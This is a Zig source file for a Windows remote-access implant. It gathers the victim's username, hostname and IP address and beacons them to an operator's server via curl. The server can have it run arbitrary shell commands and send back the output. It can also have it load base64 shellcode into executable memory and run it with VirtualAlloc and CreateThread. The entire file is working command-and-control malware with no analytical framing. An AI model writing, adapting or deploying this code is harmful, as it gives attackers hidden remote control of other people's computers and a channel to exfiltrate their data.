const std = @import("std");
const builtin = @import("builtin");
const print = std.debug.print;
const Allocator = std.mem.Allocator;
const Io = std.Io;

const agent_os = "WINDOWS";
const process_arch = if (builtin.cpu.arch == .x86_64) "x64" else "x86";

const LPTHREAD_START_ROUTINE = *const fn (?*anyopaque) callconv(.winapi) u32;

extern "kernel32" fn VirtualAlloc(
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) callconv(.winapi) ?*anyopaque;

extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: usize,
    lpStartAddress: LPTHREAD_START_ROUTINE,
    lpParameter: ?*anyopaque,
    dwCreationFlags: u32,
    lpThreadId: ?*u32,
) callconv(.winapi) ?*anyopaque;

const AgentInfo = struct {
    id: []const u8,
    username: []const u8,
    hostname: []const u8,
    ips: []const u8,
};

const Case = enum { my_what, my_terminal, my_sleep, my_spawn };

fn trimTrailing(input: []const u8) []const u8 {
    var end: usize = input.len;
    while (end > 0 and (input[end - 1] == '\r' or input[end - 1] == '\n' or input[end - 1] == ' ')) : (end -= 1) {}
    return input[0..end];
}

fn randomHexId(io: Io, buf: *[36]u8) void {
    var bytes: [16]u8 = undefined;
    io.random(&bytes);
    const hex = "0123456789abcdef";
    var pos: usize = 0;
    for (bytes, 0..) |b, i| {
        if (i == 4 or i == 6 or i == 8 or i == 10) {
            buf[pos] = '-';
            pos += 1;
        }
        buf[pos] = hex[b >> 4];
        buf[pos + 1] = hex[b & 0x0f];
        pos += 2;
    }
}

fn escapeJson(allocator: Allocator, input: []const u8) ![]u8 {
    var size: usize = 0;
    for (input) |c| {
        size += switch (c) {
            '"', '\\', '\n', '\r', '\t' => 2,
            else => if (c < 0x20) @as(usize, 6) else 1,
        };
    }
    const buf = try allocator.alloc(u8, size);
    var pos: usize = 0;
    for (input) |c| {
        switch (c) {
            '"' => {
                buf[pos] = '\\';
                buf[pos + 1] = '"';
                pos += 2;
            },
            '\\' => {
                buf[pos] = '\\';
                buf[pos + 1] = '\\';
                pos += 2;
            },
            '\n' => {
                buf[pos] = '\\';
                buf[pos + 1] = 'n';
                pos += 2;
            },
            '\r' => {
                buf[pos] = '\\';
                buf[pos + 1] = 'r';
                pos += 2;
            },
            '\t' => {
                buf[pos] = '\\';
                buf[pos + 1] = 't';
                pos += 2;
            },
            else => {
                if (c < 0x20) {
                    _ = std.fmt.bufPrint(buf[pos .. pos + 6], "\\u{x:0>4}", .{c}) catch unreachable;
                    pos += 6;
                } else {
                    buf[pos] = c;
                    pos += 1;
                }
            },
        }
    }
    return buf;
}

fn buildCheckinJson(allocator: Allocator, info: AgentInfo) ![]u8 {
    const esc_user = try escapeJson(allocator, info.username);
    defer allocator.free(esc_user);
    const esc_host = try escapeJson(allocator, info.hostname);
    defer allocator.free(esc_host);
    const esc_ips = try escapeJson(allocator, info.ips);
    defer allocator.free(esc_ips);
    return std.fmt.allocPrint(allocator,
        \\{{"id":"{s}","type":"zig","username":"{s}","hostname":"{s}","os":"{s}","processArch":"{s}","ips":"{s}","result":null}}
    , .{ info.id, esc_user, esc_host, agent_os, process_arch, esc_ips });
}

fn buildResultJson(allocator: Allocator, info: AgentInfo, result_text: []const u8) ![]u8 {
    const esc_user = try escapeJson(allocator, info.username);
    defer allocator.free(esc_user);
    const esc_host = try escapeJson(allocator, info.hostname);
    defer allocator.free(esc_host);
    const esc_ips = try escapeJson(allocator, info.ips);
    defer allocator.free(esc_ips);
    const escaped = try escapeJson(allocator, result_text);
    defer allocator.free(escaped);
    return std.fmt.allocPrint(allocator,
        \\{{"id":"{s}","type":"zig","username":"{s}","hostname":"{s}","os":"{s}","processArch":"{s}","ips":"{s}","result":"{s}"}}
    , .{ info.id, esc_user, esc_host, agent_os, process_arch, esc_ips, escaped });
}

fn httpPost(gpa: Allocator, io: Io, url: []const u8, payload: []const u8) ![]u8 {
    const result = try std.process.run(gpa, io, .{
        .argv = &.{ "curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, url },
    });
    gpa.free(result.stderr);
    return result.stdout;
}

fn extractField(json: []const u8, field: []const u8) ?[]const u8 {
    var search_key: [64]u8 = undefined;
    const key = std.fmt.bufPrint(&search_key, "\"{s}\"", .{field}) catch return null;

    const key_pos = std.mem.indexOf(u8, json, key) orelse return null;
    const after_key = json[key_pos + key.len ..];

    const colon = std.mem.indexOf(u8, after_key, ":") orelse return null;
    var trim_start: usize = 0;
    const raw_after = after_key[colon + 1 ..];
    while (trim_start < raw_after.len and (raw_after[trim_start] == ' ' or raw_after[trim_start] == '\t')) : (trim_start += 1) {}
    const after_colon = raw_after[trim_start..];

    if (after_colon.len == 0) return null;
    if (after_colon[0] == '"') {
        const start = 1;
        var end: usize = start;
        while (end < after_colon.len and after_colon[end] != '"') : (end += 1) {
            if (after_colon[end] == '\\') end += 1;
        }
        return after_colon[start..end];
    }
    if (std.mem.startsWith(u8, after_colon, "null")) return null;
    const end = std.mem.indexOfAny(u8, after_colon, ",}") orelse after_colon.len;
    const raw = after_colon[0..end];
    var s: usize = 0;
    while (s < raw.len and (raw[s] == ' ' or raw[s] == '\t' or raw[s] == '\r' or raw[s] == '\n')) : (s += 1) {}
    var e: usize = raw.len;
    while (e > s and (raw[e - 1] == ' ' or raw[e - 1] == '\t' or raw[e - 1] == '\r' or raw[e - 1] == '\n')) : (e -= 1) {}
    return raw[s..e];
}

pub fn main(init: std.process.Init) !void {
    const gpa = init.gpa;
    const io = init.io;
    const arena = init.arena.allocator();

    const args_slice = try init.minimal.args.toSlice(arena);
    if (args_slice.len < 3) {
        print("Usage: agent_zig <host> <port>\n", .{});
        print("  Example: agent_zig 127.0.0.1 8080\n", .{});
        return;
    }
    const host = args_slice[1];
    const port_str = args_slice[2];
    const url = try std.fmt.allocPrint(arena, "http://{s}:{s}/", .{ host, port_str });

    var id_buf: [36]u8 = undefined;
    randomHexId(io, &id_buf);
    const id: []const u8 = try arena.dupe(u8, &id_buf);

    const username = blk: {
        const r = std.process.run(gpa, io, .{ .argv = &.{ "cmd.exe", "/c", "whoami" } }) catch break :blk "unknown";
        defer gpa.free(r.stderr);
        const duped = arena.dupe(u8, trimTrailing(r.stdout)) catch break :blk "unknown";
        gpa.free(r.stdout);
        break :blk duped;
    };
    const hostname_val = blk: {
        const r = std.process.run(gpa, io, .{ .argv = &.{ "cmd.exe", "/c", "hostname" } }) catch break :blk "unknown";
        defer gpa.free(r.stderr);
        const duped = arena.dupe(u8, trimTrailing(r.stdout)) catch break :blk "unknown";
        gpa.free(r.stdout);
        break :blk duped;
    };
    const ips = blk: {
        const r = std.process.run(gpa, io, .{
            .argv = &.{ "powershell.exe", "-NoProfile", "-Command", "(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress" },
        }) catch break :blk "unknown";
        defer gpa.free(r.stderr);
        const duped = arena.dupe(u8, trimTrailing(r.stdout)) catch break :blk "unknown";
        gpa.free(r.stdout);
        break :blk duped;
    };

    const info = AgentInfo{ .id = id, .username = username, .hostname = hostname_val, .ips = ips };

    var sleep_secs: i64 = 2;

    print("[agent] id={s}, user={s}, host={s}, os={s}, arch={s}, ips={s}, polling {s} every {d}s\n", .{ id, username, hostname_val, agent_os, process_arch, ips, url, sleep_secs });

    while (true) {
        defer io.sleep(Io.Duration.fromSeconds(sleep_secs), .awake) catch {};

        const checkin = buildCheckinJson(gpa, info) catch continue;
        defer gpa.free(checkin);

        const body = httpPost(gpa, io, url, checkin) catch |err| {
            print("[agent] Connection failed: {}\n", .{err});
            continue;
        };
        defer gpa.free(body);

        if (body.len <= 2) continue;

        const type_str = extractField(body, "__type__") orelse continue;
        const case = std.meta.stringToEnum(Case, type_str) orelse {
            print("[agent] Unknown command: {s}\n", .{type_str});
            continue;
        };

        switch (case) {
            .my_what => {
                print("[agent] Received command: my_what\n", .{});
                const result = buildResultJson(gpa, info, "hello from zig agent") catch continue;
                defer gpa.free(result);
                const resp = httpPost(gpa, io, url, result) catch continue;
                gpa.free(resp);
            },
            .my_sleep => {
                const sleep_str = extractField(body, "sleep") orelse continue;
                const seconds = std.fmt.parseInt(i64, sleep_str, 10) catch continue;
                sleep_secs = seconds;
                print("[agent] Sleep changed to {d}s\n", .{seconds});
                const msg = std.fmt.allocPrint(gpa, "sleep changed to {d}s", .{seconds}) catch continue;
                defer gpa.free(msg);
                const result = buildResultJson(gpa, info, msg) catch continue;
                defer gpa.free(result);
                const resp = httpPost(gpa, io, url, result) catch continue;
                gpa.free(resp);
            },
            .my_terminal => {
                const cmd = extractField(body, "command") orelse continue;
                print("[agent] Running: {s}\n", .{cmd});
                const proc = std.process.run(gpa, io, .{
                    .argv = &.{ "cmd.exe", "/c", cmd },
                }) catch |err| {
                    const err_msg = std.fmt.allocPrint(gpa, "terminal error: {}", .{err}) catch continue;
                    defer gpa.free(err_msg);
                    const result = buildResultJson(gpa, info, err_msg) catch continue;
                    defer gpa.free(result);
                    const resp = httpPost(gpa, io, url, result) catch continue;
                    gpa.free(resp);
                    continue;
                };
                defer gpa.free(proc.stdout);
                defer gpa.free(proc.stderr);
                const result = buildResultJson(gpa, info, proc.stdout) catch continue;
                defer gpa.free(result);
                const resp = httpPost(gpa, io, url, result) catch continue;
                gpa.free(resp);
            },
            .my_spawn => {
                const b64_data = extractField(body, "shellcode") orelse continue;
                print("[agent] Received spawn command, shellcode base64 length: {d}\n", .{b64_data.len});
                const decoded_size = std.base64.standard.Decoder.calcSizeForSlice(b64_data) catch continue;
                const shellcode = gpa.alloc(u8, decoded_size) catch continue;
                defer gpa.free(shellcode);
                std.base64.standard.Decoder.decode(shellcode, b64_data) catch continue;
                const mem = VirtualAlloc(null, shellcode.len, 0x3000, 0x40) orelse {
                    const err_result = buildResultJson(gpa, info, "VirtualAlloc failed") catch continue;
                    defer gpa.free(err_result);
                    const err_resp = httpPost(gpa, io, url, err_result) catch continue;
                    gpa.free(err_resp);
                    continue;
                };
                const dest: [*]u8 = @ptrCast(mem);
                @memcpy(dest[0..shellcode.len], shellcode);
                const start_addr: LPTHREAD_START_ROUTINE = @ptrCast(mem);
                const thread = CreateThread(null, 0, start_addr, null, 0, null);
                const msg = if (thread != null)
                    std.fmt.allocPrint(gpa, "spawned thread for {d} bytes shellcode", .{shellcode.len}) catch continue
                else
                    std.fmt.allocPrint(gpa, "CreateThread failed for {d} bytes shellcode", .{shellcode.len}) catch continue;
                defer gpa.free(msg);
                const result = buildResultJson(gpa, info, msg) catch continue;
                defer gpa.free(result);
                const resp = httpPost(gpa, io, url, result) catch continue;
                gpa.free(resp);
            },
        }
    }
}
